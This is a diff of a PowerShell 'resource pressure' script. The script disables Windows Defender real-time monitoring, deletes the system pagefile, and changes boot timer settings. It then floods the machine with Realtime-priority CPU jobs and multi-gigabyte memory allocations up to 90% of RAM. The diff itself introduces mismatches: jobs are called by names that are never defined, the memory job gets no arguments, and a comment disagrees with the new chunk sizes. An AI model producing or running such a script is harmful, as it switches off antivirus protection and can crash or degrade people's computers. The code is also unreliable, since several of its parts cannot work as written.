@@ -12,10 +12,14 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Remove-Item -Path $registryPath -Recurse -Force
     exit
 }
+
+Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
+Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
 Import-Module ThreadJob -Force
+
 try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
 # --- System Tweaks to maximize resource pressure ---
-Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
+Invoke-Expression "wmic computersystem where name='$env:computername' set AutomaticManagedPagefile=False"
 Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
 Invoke-Expression "bcdedit /set useplatformclock true"
 Invoke-Expression "bcdedit /set disabledynamictick yes"
@@ -32,8 +36,8 @@ $physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property 
 $targetSize = [math]::Floor($physicalMem * 0.9) # 90% of physical RAM
 
 # Chunk size between 700MB and 999MB (start at 700MB)
-$minChunkSize = 0.7GB
-$maxChunkSize = 1.5GB
+$minChunkSize = 4GB
+$maxChunkSize = 15GB
 
 # Number of CPU cores
 $threads = [Environment]::ProcessorCount
@@ -78,94 +82,78 @@ $jobScript = {
     # Set thread priority highest
     [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest
 
-    # Set process priority to Realtime (aggressive)
+    # Set process priority to Realtime (aggressive) and Set process affinity to all cores
     $proc = Get-Process -Id $PID
     try {
         $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
+        $proc.ProcessorAffinity = -1
+        [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::LowLatency
+        [System.GC]::Collect()
         Write-Host "Job ${jobIndex}: Process priority set to Realtime."
     } catch {
         Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
     }
 
-    # Set process affinity to all cores
-    try {
-        $proc.ProcessorAffinity = -1
-    } catch {}
-
     # CPU Stress function with multiple CPU intensive tasks
+    $numThreads = 3
     function Stress-CPU {
         param([int]$iterations)
-        $numThreads = 3
         # Random data buffer
-        $data = [byte[]]::new(8192)
-        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
-
-        # SHA512 hashing loop
-        1..$numThreads | ForEach-Object{
-            $sha512Thread = [System.Threading.Thread]::new({
-                param($iterations, $data)
-                $sha512 = [System.Security.Cryptography.SHA512]::Create()
-                1..$iterations | ForEach-Object {
-                    $data = $sha512.ComputeHash($data)
-                }
-            })
-            $sha512Thread.Priority = [System.Threading.ThreadPriority]::Highest
-            $sha512Thread.IsBackground = $true
-            $sha512Thread.Start($iterations, $data)
+        $hashJob = {
+            $data = [byte[]]::new(8192)
+            $sha512 = [System.Security.Cryptography.SHA512]::Create()
+            while($true) {
+                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
+                $data = $sha512.ComputeHash($data)
+            }
         }
 
         # Large prime factorization (CPU heavy)
-        1..$numThreads | ForEach-Object{
-            $primeFactorizeThread = [System.Threading.Thread]::new({
+        $primeFactorJob = {
+            function Get-Primes {
                 param($n)
-                function Get-Primes {
-                    param($n)
-                    $factors = @()
-                    for ($i = 2; $i -le $n; $i++) {
-                        while ($n % $i -eq 0) {
-                            $factors += $i
-                            $n = [math]::Floor($n / $i)
-                        }
+                $factors = @()
+                for ($i = 2; $i -le $n; $i++) {
+                    while ($n % $i -eq 0) {
+                        $factors += $i
+                        $n = [math]::Floor($n / $i)
                     }
-                    return $factors
                 }
-                Get-Primes $n | Out-Null
-            })
-            $primeFactorizeThread.Priority = [System.Threading.ThreadPriority]::Highest
+                return $factors
+            }
             $number = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
-            $primeFactorizeThread.IsBackground = $true
-            $primeFactorizeThread.Start($number)
+            Get-Primes $number | Out-Null
         }
 
         # Matrix multiplication stress 
-        $size = 2147483647
-        1..$numThreads | ForEach-Object{
-            $matrixMulThread = [System.Threading.Thread]::new({
-                param($size)
-                $A = @(); $B = @(); $C = @()
-                0..($size-1) | ForEach-Object {
-                    $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
-                    $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
-                    $C += ,@(0..($size-1) | ForEach-Object { 0 })
-                }
-                0..($size-1) | ForEach-Object { $i = $_
-                    0..($size-1) | ForEach-Object { $j = $_
-                        $sum = 0
-                        0..($size-1) | ForEach-Object { $k = $_
-                            $sum += ($A[$i][$k] * $B[$k][$j])
-                        }
-                        $C[$i][$j] = $sum
+        $matrixMultiplicationJob = {
+            $size = 512
+            $A = @(); $B = @(); $C = @()
+            0..($size-1) | ForEach-Object {
+                $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
+                $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
+                $C += ,@(0..($size-1) | ForEach-Object { 0 })
+            }
+            0..($size-1) | ForEach-Object { $i = $_
+                0..($size-1) | ForEach-Object { $j = $_
+                    $sum = 0
+                    0..($size-1) | ForEach-Object { $k = $_
+                        $sum += ($A[$i][$k] * $B[$k][$j])
                     }
+                    $C[$i][$j] = $sum
                 }
-            })
-            $matrixMulThread.Priority = [System.Threading.ThreadPriority]::Highest
-            $matrixMulThread.IsBackground = $true
-            $matrixMulThread.Start($size)
+            }
+        }
+
+        1..$numThreads | ForEach-Object {
+            Start-ThreadJob -ScriptBlock $hashJob -ThrottleLimit 100 | Out-Null
+            Start-ThreadJob -ScriptBlock $primeJob -ThrottleLimit 100 | Out-Null
+            Start-ThreadJob -ScriptBlock $matrixJob -ThrottleLimit 100 | Out-Null
         }
     }
 
     # Memory Stress function progressively allocating chunks
-    function Stress-MemoryProgressive {
+    $Stress_MemoryProgressive = {
         param(
             [int64]$minChunkSize,
             [int64]$maxChunkSize,
@@ -182,7 +170,7 @@ $jobScript = {
                 continue
             }
             if ($chunkSize -lt $maxChunkSize) {
-                $chunkSize = [math]::Min($chunkSize + 0.512GB, $maxChunkSize)
+                $chunkSize = [math]::Min($chunkSize + 1GB, $maxChunkSize)
             }
             try {
                 $chunk = New-Object byte[] $chunkSize
@@ -198,23 +186,16 @@ $jobScript = {
 
     # Start memory stress in background thread
     1..$numThreads | ForEach-Object{
-        $memThread = [System.Threading.Thread]::new({
-            param($minCS, $maxCS, $target)
-            Stress-MemoryProgressive $minCS $maxCS $target
-        })
-        $memThread.Priority = [System.Threading.ThreadPriority]::Highest
-        $memThread.IsBackground = $true
-        $memThread.Start($minChunkSize, $maxChunkSize, $targetSize)
+        Start-ThreadJob -ScriptBlock $Stress_MemoryProgressive -ThrottleLimit 100 | Out-Null
     }
 
     # CPU stress loop with progressive load increase
-    $iterations = 1_000_000
+    $iterations = 1000000
     while ($true) {
         try {
             Stress-CPU -iterations $iterations
         } catch {}
 
-        Write-Progress -Activity "Job $jobIndex CPU Stress" -Status "Iterations: $iterations"
         Start-Sleep -Milliseconds 200
 
         if ($iterations -lt 10000000) {
